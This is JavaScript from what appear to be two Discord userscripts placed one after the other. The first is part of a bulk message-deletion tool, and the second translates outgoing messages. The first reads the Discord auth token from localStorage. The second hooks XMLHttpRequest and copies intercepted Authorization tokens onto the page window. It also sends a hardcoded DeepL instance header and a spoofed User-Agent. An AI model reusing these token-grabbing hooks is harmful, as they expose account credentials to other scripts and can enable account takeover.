        let API_SEARCH_URL;
        if (guildId === '@me') {
            API_SEARCH_URL = `https://discord.com/api/v6/channels/${channelId}/messages/`; // DMs
        }
        else {
            API_SEARCH_URL = `https://discord.com/api/v6/guilds/${guildId}/messages/`; // Server
        }

        const headers = {
            'Authorization': authToken
        };

        let resp;
        try {
            const s = Date.now();
            resp = await fetch(API_SEARCH_URL + 'search?' + queryString([
                ['author_id', authorId || undefined],
                ['channel_id', (guildId !== '@me' ? channelId : undefined) || undefined],
                ['min_id', minId ? toSnowflake(minId) : undefined],
                ['max_id', maxId ? toSnowflake(maxId) : undefined],
                ['sort_by', 'timestamp'],
                ['sort_order', 'desc'],
                ['offset', offset],
                ['has', hasLink ? 'link' : undefined],
                ['has', hasFile ? 'file' : undefined],
                ['content', content || undefined],
                ['include_nsfw', includeNsfw ? true : undefined],
            ]), { headers });
            lastPing = (Date.now() - s);
            avgPing = avgPing > 0 ? (avgPing * 0.9) + (lastPing * 0.1) : lastPing;
        } catch (err) {
            return log.error('Search request threw an error:', err);
        }

        // not indexed yet
        if (resp.status === 202) {
            const w = (await resp.json()).retry_after;
            throttledCount++;
            throttledTotalTime += w;
            log.warn(`This channel wasn't indexed, waiting ${w}ms for discord to index it...`);
            await wait(w);
            return await recurse();
        }

        if (!resp.ok) {
            // searching messages too fast
            if (resp.status === 429) {
                const w = (await resp.json()).retry_after;
                throttledCount++;
                throttledTotalTime += w;
                searchDelay += w; // increase delay
                log.warn(`Being rate limited by the API for ${w}ms! Increasing search delay...`);
                printDelayStats();
                log.verb(`Cooling down for ${w * 2}ms before retrying...`);

                await wait(w * 2);
                return await recurse();
            } else {
                return log.error(`Error searching messages, API responded with status ${resp.status}!\n`, await resp.json());
            }
        }

        const data = await resp.json();
        const total = data.total_results;
        if (!grandTotal) grandTotal = total;
        const discoveredMessages = data.messages.map(convo => convo.find(message => message.hit === true));
        const messagesToDelete = discoveredMessages.filter(msg => {
            return msg.type === 0 || msg.type === 6 || (msg.pinned && includePinned);
        });
        const skippedMessages = discoveredMessages.filter(msg => !messagesToDelete.find(m => m.id === msg.id));

        const end = () => {
            log.success(`Ended at ${new Date().toLocaleString()}! Total time: ${msToHMS(Date.now() - start.getTime())}`);
            printDelayStats();
            log.verb(`Rate Limited: ${throttledCount} times. Total time throttled: ${msToHMS(throttledTotalTime)}.`);
            log.debug(`Deleted ${delCount} messages, ${failCount} failed.\n`);
        }

        const etr = msToHMS((searchDelay * Math.round(total / 25)) + ((deleteDelay + avgPing) * total));
        log.info(`Total messages found: ${data.total_results}`, `(Messages in current page: ${data.messages.length}, To be deleted: ${messagesToDelete.length}, System: ${skippedMessages.length})`, `offset: ${offset}`);
        printDelayStats();
        log.verb(`Estimated time remaining: ${etr}`)


        if (messagesToDelete.length > 0) {

            if (++iterations < 1) {
                log.verb(`Waiting for your confirmation...`);
                if (!await ask(`Do you want to delete ~${total} messages?\nEstimated time: ${etr}\n\n---- Preview ----\n` +
                    messagesToDelete.map(m => `${m.author.username}#${m.author.discriminator}: ${m.attachments.length ? '[ATTACHMENTS]' : m.content}`).join('\n')))
                    return end(log.error('Aborted by you!'));
                log.verb(`OK`);
            }

            for (let i = 0; i < messagesToDelete.length; i++) {
                const message = messagesToDelete[i];
                if (stopHndl && stopHndl() === false) return end(log.error('Stopped by you!'));

                log.debug(`${((delCount + 1) / grandTotal * 100).toFixed(2)}% (${delCount + 1}/${grandTotal})`,
                    `Deleting ID:${redact(message.id)} <b>${redact(message.author.username + '#' + message.author.discriminator)} <small>(${redact(new Date(message.timestamp).toLocaleString())})</small>:</b> <i>${redact(message.content).replace(/\n/g, '↵')}</i>`,
                    message.attachments.length ? redact(JSON.stringify(message.attachments)) : '');
                if (onProgress) onProgress(delCount + 1, grandTotal);

                let resp;
                try {
                    const s = Date.now();
                    const API_DELETE_URL = `https://discord.com/api/v6/channels/${message.channel_id}/messages/${message.id}`;
                    resp = await fetch(API_DELETE_URL, {
                        headers,
                        method: 'DELETE'
                    });
                    lastPing = (Date.now() - s);
                    avgPing = (avgPing * 0.9) + (lastPing * 0.1);
                    delCount++;
                } catch (err) {
                    log.error('Delete request throwed an error:', err);
                    log.verb('Related object:', redact(JSON.stringify(message)));
                    failCount++;
                }

                if (!resp.ok) {
                    // deleting messages too fast
                    if (resp.status === 429) {
                        const w = (await resp.json()).retry_after;
                        throttledCount++;
                        throttledTotalTime += w;
                        deleteDelay = w; // increase delay
                        log.warn(`Being rate limited by the API for ${w}ms! Adjusted delete delay to ${deleteDelay}ms.`);
                        printDelayStats();
                        log.verb(`Cooling down for ${w * 2}ms before retrying...`);
                        await wait(w * 2);
                        i--; // retry
                    } else {
                        log.error(`Error deleting message, API responded with status ${resp.status}!`, await resp.json());
                        log.verb('Related object:', redact(JSON.stringify(message)));
                        failCount++;
                    }
                }

                await wait(deleteDelay);
            }

            if (skippedMessages.length > 0) {
                grandTotal -= skippedMessages.length;
                offset += skippedMessages.length;
                log.verb(`Found ${skippedMessages.length} system messages! Decreasing grandTotal to ${grandTotal} and increasing offset to ${offset}.`);
            }

            log.verb(`Searching next messages in ${searchDelay}ms...`, (offset ? `(offset: ${offset})` : ''));
            await wait(searchDelay);

            if (stopHndl && stopHndl() === false) return end(log.error('Stopped by you!'));

            return await recurse();
        } else {
            if (total - offset > 0) log.warn('Ended because API returned an empty page.');
            return end();
        }
    }

    log.success(`\nStarted at ${start.toLocaleString()}`);
    log.debug(`authorId="${redact(authorId)}" guildId="${redact(guildId)}" channelId="${redact(channelId)}" minId="${redact(minId)}" maxId="${redact(maxId)}" hasLink=${!!hasLink} hasFile=${!!hasFile}`);
    if (onProgress) onProgress(null, 1);
    return await recurse();
}

//---- User interface ----//

let popover;
let btn;
let stop;

function initUI() {

    const insertCss = (css) => {
        const style = document.createElement('style');
        style.appendChild(document.createTextNode(css));
        document.head.appendChild(style);
        return style;
    }

    const createElm = (html) => {
        const temp = document.createElement('div');
        temp.innerHTML = html;
        return temp.removeChild(temp.firstElementChild);
    }

    insertCss(`
        #undicord-btn{position: relative; height: 24px;width: auto;-webkit-box-flex: 0;-ms-flex: 0 0 auto;flex: 0 0 auto;margin: 0 8px;cursor:pointer; color: var(--interactive-normal);}
        #undiscord{position:fixed;top:100px;right:10px;bottom:10px;width:780px;z-index:99;color:var(--text-normal);background-color:var(--background-secondary);box-shadow:var(--elevation-stroke),var(--elevation-high);border-radius:4px;display:flex;flex-direction:column}
        #undiscord a{color:#00b0f4}
        #undiscord.redact .priv{display:none!important}
        #undiscord:not(.redact) .mask{display:none!important}
        #undiscord.redact [priv]{-webkit-text-security:disc!important}
        #undiscord .toolbar span{margin-right:8px}
        #undiscord button,#undiscord .btn{color:#fff;background:#7289da;border:0;border-radius:4px;font-size:14px}
        #undiscord button:disabled{display:none}
        #undiscord input[type="text"],#undiscord input[type="search"],#undiscord input[type="password"],#undiscord input[type="datetime-local"],#undiscord input[type="number"]{background-color:#202225;color:#b9bbbe;border-radius:4px;border:0;padding:0 .5em;height:24px;width:144px;margin:2px}
        #undiscord input#file{display:none}
        #undiscord hr{border-color:rgba(255,255,255,0.1)}
        #undiscord .header{padding:12px 16px;background-color:var(--background-tertiary);color:var(--text-muted)}
        #undiscord .form{padding:8px;background:var(--background-secondary);box-shadow:0 1px 0 rgba(0,0,0,.2),0 1.5px 0 rgba(0,0,0,.05),0 2px 0 rgba(0,0,0,.05)}
        #undiscord .logarea{overflow:auto;font-size:.75rem;font-family:Consolas,Liberation Mono,Menlo,Courier,monospace;flex-grow:1;padding:10px}
    `);

    popover = createElm(`
    <div id="undiscord" style="display:none;">
        <div class="header">
            Undiscord - Bulk delete messages
        </div>
        <div class="form">
            <div style="display:flex;flex-wrap:wrap;">
                <span>Authorization <a
                        href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/authToken.md" title="Help"
                        target="_blank">?</a> <button id="getToken">get</button><br>
                    <input type="password" id="authToken" placeholder="Auth Token" autofocus>*<br>
                    <span>Author <a href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/authorId.md"
                            title="Help" target="_blank">?</a> <button id="getAuthor">get</button></span>
                    <br><input id="authorId" type="text" placeholder="Author ID" priv></span>
                <span>Guild/Channel <a
                        href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/channelId.md" title="Help"
                        target="_blank">?</a>
                    <button id="getGuildAndChannel">get</button><br>
                    <input id="guildId" type="text" placeholder="Guild ID" priv><br>
                    <input id="channelId" type="text" placeholder="Channel ID" priv><br>
                    <label><input id="includeNsfw" type="checkbox">NSFW Channel</label><br><br>
                    <label for="file" title="Import list of channels from messages/index.json file"> Import: <span
                            class="btn">...</span> <input id="file" type="file" accept="application/json,.json"></label>
                </span><br>
                <span>Range <a href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/messageId.md"
                        title="Help" target="_blank">?</a><br>
                    <input id="minDate" type="datetime-local" title="After" style="width:auto;"><br>
                    <input id="maxDate" type="datetime-local" title="Before" style="width:auto;"><br>
                    <input id="minId" type="text" placeholder="After message with Id" priv><br>
                    <input id="maxId" type="text" placeholder="Before message with Id" priv><br>
                </span>
                <span>Search messages <a
                        href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/filters.md" title="Help"
                        target="_blank">?</a><br>
                    <input id="content" type="text" placeholder="Containing text" priv><br>
                    <label><input id="hasLink" type="checkbox">has: link</label><br>
                    <label><input id="hasFile" type="checkbox">has: file</label><br>
                    <label><input id="includePinned" type="checkbox">Include pinned</label>
                </span><br>
                <span>Search Delay <a
                href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/delay.md" title="Help"
                target="_blank">?</a><br>
                    <input id="searchDelay" type="number" value="100" step="100"><br>
                </span>
                <span>Delete Delay <a
                href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/delay.md" title="Help"
                target="_blank">?</a><br>
                    <input id="deleteDelay" type="number" value="1000" step="100">
                </span>
            </div>
            <hr>
            <button id="start" style="background:#43b581;width:80px;">Start</button>
            <button id="stop" style="background:#f04747;width:80px;" disabled>Stop</button>
            <button id="clear" style="width:80px;">Clear log</button>
            <label><input id="autoScroll" type="checkbox" checked>Auto scroll</label>
            <label title="Hide sensitive information for taking screenshots"><input id="redact" type="checkbox">Screenshot
                mode</label>
            <progress id="progress" style="display:none;"></progress> <span class="percent"></span>
        </div>
        <pre class="logarea">
            <center>Star this project on <a href="https://github.com/victornpb/deleteDiscordMessages" target="_blank">github.com/victornpb/deleteDiscordMessages</a>!\n\n
                <a href="https://github.com/victornpb/deleteDiscordMessages/issues" target="_blank">Issues or help</a>
            </center>
        </pre>
    </div>
    `);

    document.body.appendChild(popover);

    btn = createElm(`<div id="undicord-btn" tabindex="0" role="button" aria-label="Delete Messages" title="Delete Messages">
    <svg aria-hidden="false" width="24" height="24" viewBox="0 0 24 24">
        <path fill="currentColor" d="M15 3.999V2H9V3.999H3V5.999H21V3.999H15Z"></path>
        <path fill="currentColor" d="M5 6.99902V18.999C5 20.101 5.897 20.999 7 20.999H17C18.103 20.999 19 20.101 19 18.999V6.99902H5ZM11 17H9V11H11V17ZM15 17H13V11H15V17Z"></path>
    </svg>
    <br><progress style="display:none; width:24px;"></progress>
</div>`);

    btn.onclick = function togglePopover() {
        if (popover.style.display !== 'none') {
            popover.style.display = 'none';
            btn.style.color = 'var(--interactive-normal)';
        }
        else {
            popover.style.display = '';
            btn.style.color = '#f04747';
        }
    };

    function mountBtn() {
        const toolbar = document.querySelector('[class^=toolbar]');
        if (toolbar) toolbar.appendChild(btn);
    }

    const observer = new MutationObserver(function (_mutationsList, _observer) {
        if (!document.body.contains(btn)) mountBtn(); // re-mount the button to the toolbar
    });
    observer.observe(document.body, { attributes: false, childList: true, subtree: true });

    mountBtn();

    const $ = s => popover.querySelector(s);
    const logArea = $('pre');
    const startBtn = $('button#start');
    const stopBtn = $('button#stop');
    const autoScroll = $('#autoScroll');

    startBtn.onclick = async e => {
        const authToken = $('input#authToken').value.trim();
        const authorId = $('input#authorId').value.trim();
        const guildId = $('input#guildId').value.trim();
        const channelIds = $('input#channelId').value.trim().split(/\s*,\s*/);
        const minId = $('input#minId').value.trim();
        const maxId = $('input#maxId').value.trim();
        const minDate = $('input#minDate').value.trim();
        const maxDate = $('input#maxDate').value.trim();
        const content = $('input#content').value.trim();
        const hasLink = $('input#hasLink').checked;
        const hasFile = $('input#hasFile').checked;
        const includeNsfw = $('input#includeNsfw').checked;
        const includePinned = $('input#includePinned').checked;
        const searchDelay = parseInt($('input#searchDelay').value.trim());
        const deleteDelay = parseInt($('input#deleteDelay').value.trim());
        const progress = $('#progress');
        const progress2 = btn.querySelector('progress');
        const percent = $('.percent');

        const fileSelection = $("input#file");
        fileSelection.addEventListener("change", () => {
            const files = fileSelection.files;
            const channelIdField = $('input#channelId');
            if (files.length > 0) {
                const file = files[0];
                file.text().then(text => {
                    let json = JSON.parse(text);
                    let channels = Object.keys(json);
                    channelIdField.value = channels.join(",");
                });
            }
        }, false);

        const stopHndl = () => !(stop === true);

        const onProg = (value, max) => {
            if (value && max && value > max) max = value;
            progress.setAttribute('max', max);
            progress.value = value;
            progress.style.display = max ? '' : 'none';
            progress2.setAttribute('max', max);
            progress2.value = value;
            progress2.style.display = max ? '' : 'none';
            percent.innerHTML = value && max ? Math.round(value / max * 100) + '%' : '';
        };


        stop = stopBtn.disabled = !(startBtn.disabled = true);
        for (let i = 0; i < channelIds.length; i++) {
            await deleteMessages(authToken, authorId, guildId, channelIds[i], minId || minDate, maxId || maxDate, content, hasLink, hasFile, includeNsfw, includePinned, searchDelay, deleteDelay, logger, stopHndl, onProg);
            stop = stopBtn.disabled = !(startBtn.disabled = false);
        }
    };
    stopBtn.onclick = e => stop = stopBtn.disabled = !(startBtn.disabled = false);
    $('button#clear').onclick = e => { logArea.innerHTML = ''; };
    $('button#getToken').onclick = e => {
        window.dispatchEvent(new Event('beforeunload'));
        const ls = document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage;
        $('input#authToken').value = JSON.parse(localStorage.token);
    };
    $('button#getAuthor').onclick = e => {
        $('input#authorId').value = JSON.parse(localStorage.user_id_cache);
    };
    $('button#getGuildAndChannel').onclick = e => {
        const m = location.href.match(/channels\/([\w@]+)\/(\d+)/);
        $('input#guildId').value = m[1];
        $('input#channelId').value = m[2];
    };
    $('#redact').onchange = e => {
        popover.classList.toggle('redact') &&
            window.alert('This will attempt to hide personal information, but make sure to double check before sharing screenshots.');
    };

    const logger = (type = '', args) => {
        const style = { '': '', info: 'color:#00b0f4;', verb: 'color:#72767d;', warn: 'color:#faa61a;', error: 'color:#f04747;', success: 'color:#43b581;' }[type];
        logArea.insertAdjacentHTML('beforeend', `<div style="${style}">${Array.from(args).map(o => typeof o === 'object' ? JSON.stringify(o, o instanceof Error && Object.getOwnPropertyNames(o)) : o).join('\t')}</div>`);
        if (autoScroll.checked) logArea.querySelector('div:last-child').scrollIntoView(false);
    };

    // fixLocalStorage
    window.localStorage = document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage;

}

initUI();

    var hookAjax = '!function(t){function r(n){if(e[n])return e[n].exports;var o=e[n]={exports:{},id:n,loaded:!1};return t[n].call(o.exports,o,o.exports,r),o.loaded=!0,o.exports}var e={};return r.m=t,r.c=e,r.p="",r(0)}([function(t,r,e){e(1)(window)},function(t,r){t.exports=function(t){t.hookAjax=function(t){function r(r){return function(){var e=this.hasOwnProperty(r+"_")?this[r+"_"]:this.xhr[r],n=(t[r]||{}).getter;return n&&n(e,this)||e}}function e(r){return function(e){var n=this.xhr,o=this,i=t[r];if("function"==typeof i)n[r]=function(){t[r](o)||e.apply(n,arguments)};else{var a=(i||{}).setter;e=a&&a(e,o)||e;try{n[r]=e}catch(t){this[r+"_"]=e}}}}function n(r){return function(){var e=[].slice.call(arguments);if(!t[r]||!t[r].call(this,e,this.xhr))return this.xhr[r].apply(this.xhr,e)}}window._ahrealxhr=window._ahrealxhr||XMLHttpRequest,XMLHttpRequest=function(){var t=new window._ahrealxhr;Object.defineProperty(this,"xhr",{value:t})};var o=window._ahrealxhr.prototype;for(var i in o){var a="";try{a=typeof o[i]}catch(t){}"function"===a?XMLHttpRequest.prototype[i]=n(i):Object.defineProperty(XMLHttpRequest.prototype,i,{get:r(i),set:e(i),enumerable:!0})}return window._ahrealxhr},t.unHookAjax=function(){window._ahrealxhr&&(XMLHttpRequest=window._ahrealxhr),window._ahrealxhr=void 0},t.default=t}}]);';
var langCodes = ["ja-JP(日本語)", "zh-CHS(简中)", "en-US(English)", "自动检测/AutoDetect", "Spanish(Español)", "zh-CHT(繁中)", 'portuguese(Português)'];
var GMDiscordTrsOpt = {};
GMDiscordTrsOpt.GMDiscordTrsOn = GM_getValue(['GMDiscordTrsOn']) === true ? true: false;
GMDiscordTrsOpt.GMDiscordTrssplitStrDef = GM_getValue('GMDiscordTrssplitStrDef') ? GM_getValue('GMDiscordTrssplitStrDef') : "\r\n";
GMDiscordTrsOpt.GMDiscordTrsOnlyDist = GM_getValue(['GMDiscordTrsOnlyDist']) === true ? true: false;
GMDiscordTrsOpt.GMDiscordTrsApiKey = GM_getValue('GMDiscordTrsApiKey') ? GM_getValue('GMDiscordTrsApiKey') : "";
GMDiscordTrsOpt.GMDiscordTrsAppId = GM_getValue('GMDiscordTrsAppId') ? GM_getValue('GMDiscordTrsAppId') : "";
GMDiscordTrsOpt.GMDiscordTrsFromLang = !GM_getValue('GMDiscordTrsFromLang') ? 0 : GM_getValue('GMDiscordTrsFromLang');
GMDiscordTrsOpt.GMDiscordTrsToLang = !GM_getValue('GMDiscordTrsToLang') ? 0 : GM_getValue('GMDiscordTrsToLang');
GMDiscordTrsOpt.GMDiscordTrsShowEngine = !GM_getValue('GMDiscordTrsShowEngine') ? false : GM_getValue('GMDiscordTrsShowEngine');
var engineFuncs = {
    Google: function(text, callback) {
        var langPars = ['ja', 'zh-CN', 'en', 'auto', 'es', 'zh-CN', 'pt'];
        GM_xmlhttpRequest({
            method: 'GET',
            url: "https://translate.google.com/translate_a/single?client=at&sl=" + langPars[GMDiscordTrsOpt.GMDiscordTrsFromLang] + "&tl=" + langPars[GMDiscordTrsOpt.GMDiscordTrsToLang] + "&dt=t&q=" + encodeURIComponent(text),
            onload: function(responseDetails) {
                //console.warn(responseDetails);
                try {
                    var result = JSON.parse(responseDetails.response);
                    var tt = "";
                    result[0].forEach(function(a) {
                        tt += a[0]
                    });
                    callback(tt);
                } catch(e) {
                    callback("");
                    console.error(e);
                }
            },
            "headers": {
                "User-Agent": "memoQ",
                "Accept": "*/*",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
            },
            onerror: function(error) {
                console.error(error);
            }
        });
    },
    Caiyun: function(text, callback) {
        var langPars = ['ja', 'zh', 'en', 'auto', 'es', 'zh', 'pt'];
        GM_xmlhttpRequest({
            method: 'POST',
            url: "http://api.interpreter.caiyunai.com/v1/translator",
            data: JSON.stringify({
                "source": text,
                "trans_type": langPars[GMDiscordTrsOpt.GMDiscordTrsFromLang] + "2" + langPars[GMDiscordTrsOpt.GMDiscordTrsToLang],
                "request_id": "demo",
                "detect": false,
            }),
            onload: function(responseDetails) {
                try {
                    console.warn(responseDetails);
                    var result = JSON.parse(responseDetails.response);
                    callback(result.target);
                } catch(e) {
                    callback("");
                    console.error(e);
                }
            },
            "headers": {
                "Content-type": "application/json",
                'x-authorization': "token " + GMDiscordTrsOpt.GMDiscordTrsApiKey
            },
            onerror: function(error) {
                console.error(error);
            }
        });
    },
    DeepL: function(text, callback) {
        var langPars = ['JA', 'ZH', 'EN', 'AUTO', 'ES', 'ZH', 'PT'];
        var preArg = "ignore_tags=trsIgnoretag&tag_handling=xml&source_lang=" + langPars[GMDiscordTrsOpt.GMDiscordTrsFromLang] + "&target_lang=" + langPars[GMDiscordTrsOpt.GMDiscordTrsToLang] + "&preserve_formatting=0&auth_key=" + GMDiscordTrsOpt.GMDiscordTrsApiKey;
        GM_xmlhttpRequest({
            method: 'POST',
            url: "https://api.deepl.com/v1/translate",
            data: preArg + "&text=" + encodeURIComponent(text),
            onload: function(responseDetails) {
                try {
                    //console.warn(responseDetails);
                    var result = JSON.parse(responseDetails.response);
                    callback(result.translations[0].text);
                } catch(e) {
                    callback("");
                    console.error(e);
                }
            },
            "headers": {
                "User-Agent": "memoQ",
                "Accept": "*/*",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Content-type": "application/x-www-form-urlencoded",
                "X-Instance": "QzBDQTdCRjNGODREQAAZ0VBNzTTXTRCRUFFMTgwMEUyMDMAAfxQTlBMTIyQjA0MDgwRTM5ODxxsazQTdGRA=="
            },
            onerror: function(error) {
                console.error(error);
            }
        });
    },
    Baidu: function(text, callback) {
        var langPars = ['jp', 'zh', 'en', 'auto', 'spa', 'zh', 'pt'];
        var appid = GMDiscordTrsOpt.GMDiscordTrsAppId;
        var key = GMDiscordTrsOpt.GMDiscordTrsApiKey;
        var salt = "125637";
        var str1 = appid + text + salt + key;
        var sign = md5(str1).toLowerCase();
        var query = "q=" + encodeURIComponent(text) + "&appid=" + encodeURIComponent(appid) + "&salt=" + encodeURIComponent(salt) + "&from=" + encodeURIComponent(langPars[GMDiscordTrsOpt.GMDiscordTrsFromLang]) + "&to=" + encodeURIComponent(langPars[GMDiscordTrsOpt.GMDiscordTrsToLang]) + "&sign=" + encodeURIComponent(sign);
        GM_xmlhttpRequest({
            method: 'POST',
            url: 'https://api.fanyi.baidu.com/api/trans/vip/translate',
            data: query,
            onload: function(responseDetails) {
                try {
                    //console.warn(responseDetails);
                    var result = JSON.parse(responseDetails.response);
                    var rText = "";
                    for (var i = 0; i < result.trans_result.length; i++) {
                        if (i > 0) {
                            rText += "\r\n";
                        }
                        rText += result.trans_result[i].dst;
                    }
                    callback(rText);
                } catch(e) {
                    callback("");
                    console.error(e);
                }
            },
            "headers": {
                "accept": "*/*",
                "accept-language": "zh-CN,zh;q=0.9,ja-JP;q=0.8,ja;q=0.7,en;q=0.6,eo;q=0.5",
                "cache-control": "no-cache",
                "Content-Type": "application/x-www-form-urlencoded"
            },
            onerror: function(error) {
                console.error(error);
            }
        });
    }
};
GMDiscordTrsOpt.GMDiscordTrsEngine = (Object.keys(engineFuncs).indexOf(GM_getValue('GMDiscordTrsEngine')) !== -1) ? GM_getValue('GMDiscordTrsEngine') : "Google";
GMDiscordTrsOpt.GMDiscordTrsEngineLast = GMDiscordTrsOpt.GMDiscordTrsEngine;
(function() {
    'use strict';
    unsafeWindow.eval(hookAjax);

    unsafeWindow.hookAjax({
        setRequestHeader: function(arg, xhr) {
            if (arg[0] == "Authorization") {
                //为其他脚本设置的这个....你可以干掉它.
                unsafeWindow.userToken = arg[1];
            }
        },
        open: function(args, xhr) {
            xhr.url = args[1]
            return false;
        },
        send: function(args, xhr) {
            if (!GMDiscordTrsOpt.GMDiscordTrsOn || GMDiscordTrsOpt.GMDiscordTrsToLang === GMDiscordTrsOpt.GMDiscordTrsFromLang) {
                return false;
            }
            if (xhr.url.match(/https:\/\/discord.com\/api\/v\d+\/channels\/\d+\/messages/)) {
                if (args[0]) {
                    if (xhr.fixed) {
                        return false;
                    }
                    xhr.fixed = true;
                    try{
                        //debugger;
                        var msg = JSON.parse(args[0]);
                        if (msg.content && msg.content.length > 1) {
                            var cb = (function(msg, xhr) {
                                return function(text) {
                                    if(text !== ""){
                                        if(GMDiscordTrsOpt.GMDiscordTrsShowEngine){
                                            text = GMDiscordTrsOpt.GMDiscordTrsEngine + ": " + text;
                                        }
                                        if(GMDiscordTrsOpt.GMDiscordTrsToLang === 5){
                                            text = s2t(text);
                                        }
                                        if(GMDiscordTrsOpt.GMDiscordTrsToLang === 1){
                                            text = t2s(text);
                                        }
                                        if(msg.content && msg.content !== text){
                                            if (GMDiscordTrsOpt.GMDiscordTrsOnlyDist) {
                                                msg.content = text;
                                            } else {
                                                msg.content = msg.content + GMDiscordTrsOpt.GMDiscordTrssplitStrDef + text;
                                            }
                                        }
                                    }
                                    xhr.send(JSON.stringify(msg));
                                }
                            })(msg, xhr);
                            if((GMDiscordTrsOpt.GMDiscordTrsToLang === 5 && GMDiscordTrsOpt.GMDiscordTrsFromLang === 1) || (GMDiscordTrsOpt.GMDiscordTrsToLang === 1 && GMDiscordTrsOpt.GMDiscordTrsFromLang === 5)){
                                setTimeout((function(cb,text){
                                    cb(text);
                                })(cb,msg.content),10);
                                return true;
                            }
                            engineFuncs[GMDiscordTrsOpt.GMDiscordTrsEngine](msg.content, cb);
                            return true;
                        }
                    } catch(e) {
                        console.error(e);
                    }
                    return false;
                }
            }
            return false;
        }
    });

    function appendLangTrsSelect(fromSelAppendTo, toSelAppendTo) {
        var fromSel = document.createElement('Select');
        var toSel = document.createElement('Select');
        for (var i = 0; i < langCodes.length; i++) {
            if (i === 3) {
                continue;
            }
            var fromOpt = document.createElement('Option');
            var toOpt = document.createElement('Option');
            fromOpt.innerText = langCodes[i];
            fromOpt.value = i.toString();
            fromSel.appendChild(fromOpt);
            if (i !== 3) { //"自动检测/AutoDetect"
                toOpt.innerText = langCodes[i];
                toOpt.value = i.toString();
                toSel.appendChild(toOpt);
            }
        }
        fromSel.value = GMDiscordTrsOpt.GMDiscordTrsFromLang.toString();
        toSel.value = GMDiscordTrsOpt.GMDiscordTrsToLang.toString();
        fromSel.onchange = function(ev) {
            GMDiscordTrsOpt.GMDiscordTrsFromLang = this.value * 1;
            GM_setValue('GMDiscordTrsFromLang', this.value * 1);
        }
        toSel.onchange = function(ev) {
            GMDiscordTrsOpt.GMDiscordTrsToLang = this.value * 1;
            GM_setValue('GMDiscordTrsToLang', this.value * 1);
        }
        fromSelAppendTo.appendChild(fromSel);
        toSelAppendTo.appendChild(toSel);
    }

    function addTextInputGMSet(name, getValWrapFunc, setValWrapFunc, hide) {
        var inputTrs = document.createElement("input");
        inputTrs.type = "text";
        if (hide) {
            inputTrs.style.backgroundColor = "#fff";
            inputTrs.style.color = "#fff";
        }
        var gvar = GMDiscordTrsOpt[name];
        if (getValWrapFunc) {
            gvar = getValWrapFunc(gvar);
        }
        inputTrs.value = gvar;
        var EvFunc = (function(name, getValWrapFunc, setValWrapFunc) {
            return function() {
                var val = this.value;
                if (setValWrapFunc) {
                    val = setValWrapFunc(val);
                }
                GMDiscordTrsOpt[name] = val;
                GM_setValue(name, val);
            }
        })(name, getValWrapFunc, setValWrapFunc);
        inputTrs.onchange = EvFunc;
        inputTrs.onkeydown = EvFunc;
        if (hide) {
            inputTrs.onfocus = function() {
                this.style.color = "#000";
            }
            inputTrs.onblur = function() {
                this.style.color = "#fff";
            }
        }
        return inputTrs;
    }
    function addCheckBoxInputGMSet(name, getValWrapFunc, setValWrapFunc) {
        var inputTrs = document.createElement("input");
        inputTrs.type = "checkbox";
        var gvar = GMDiscordTrsOpt[name];
        if (getValWrapFunc) {
            gvar = getValWrapFunc(gvar);
        }
        inputTrs.checked = gvar;
        var EvFunc = (function(name) {
            return function() {
                var val = this.checked;
                if (getValWrapFunc) {
                    val = setValWrapFunc(val);
                }
                GMDiscordTrsOpt[name] = val;
                GM_setValue(name, val);
            }
        })(name);
        inputTrs.onchange = EvFunc;
        return inputTrs;
    }
    function toggleOptions() {
        var CHackDiscordTrsToolOptionDiv = document.getElementById('CHackDiscordTrsToolOptionDiv');
        if (CHackDiscordTrsToolOptionDiv) {
            CHackDiscordTrsToolOptionDiv.remove();
            return;
        }
        //var computedStyleAppMount = document.defaultView.getComputedStyle(document.getElementById('app-mount'));
        //var computedStyleHeader = document.defaultView.getComputedStyle(document.querySelector('header[class^=header]'));

        var wrap = document.createElement("div");
        wrap.id = "CHackDiscordTrsToolOptionDiv";
        wrap.style = "position: fixed;display: inline-block;background-color: var(--background-secondary);color: var(--interactive-active);z-index: 999999999;right: 1em;top: 3em;padding: 1em;border-radius: 1em;box-shadow: 0 0 4px #000;";

        wrap.insertAdjacentHTML('beforeend', "<br>Global Switch: ");
        wrap.insertAdjacentElement('beforeend', addCheckBoxInputGMSet('GMDiscordTrsOn'));

        wrap.insertAdjacentHTML('beforeend', "<br>Only Send Dest Lang: ");
        wrap.insertAdjacentElement('beforeend', addCheckBoxInputGMSet('GMDiscordTrsOnlyDist'));

        wrap.insertAdjacentHTML('beforeend', "<br>Show Engine In Msg: ");
        wrap.insertAdjacentElement('beforeend', addCheckBoxInputGMSet('GMDiscordTrsShowEngine'));
        var inputSplit = addTextInputGMSet("GMDiscordTrssplitStrDef",
                                           function(val) {
            val = JSON.stringify(val);
            val = val.substr(1, val.length - 2);
            return val;
        },
                                           function(val) {
            return JSON.parse('"' + val.replace(/"/g, '\"') + '"');
        });

        wrap.insertAdjacentHTML('beforeend', "<br>Split for Src / Dst text: ");
        wrap.insertAdjacentElement('beforeend', inputSplit);

        wrap.insertAdjacentHTML('beforeend', "<br>ApiKey: ");
        wrap.insertAdjacentElement('beforeend', addTextInputGMSet("GMDiscordTrsApiKey", undefined, undefined, true));

        wrap.insertAdjacentHTML('beforeend', "<br>AppId: ");
        wrap.insertAdjacentElement('beforeend', addTextInputGMSet("GMDiscordTrsAppId", undefined, undefined, true));
        wrap.insertAdjacentHTML('beforeend', "(If needed)");

        wrap.insertAdjacentHTML('beforeend', "<br> Engine: ");
        Object.keys(engineFuncs).forEach(function(e) {
            var inputTrsEngine = document.createElement("input");
            inputTrsEngine.type = "radio";
            inputTrsEngine.name = "TrsEnging";
            inputTrsEngine.checked = GMDiscordTrsOpt.GMDiscordTrsEngine === e;
            inputTrsEngine.onchange = (function(e) {
                return function() {
                    GMDiscordTrsOpt.GMDiscordTrsEngine = e;
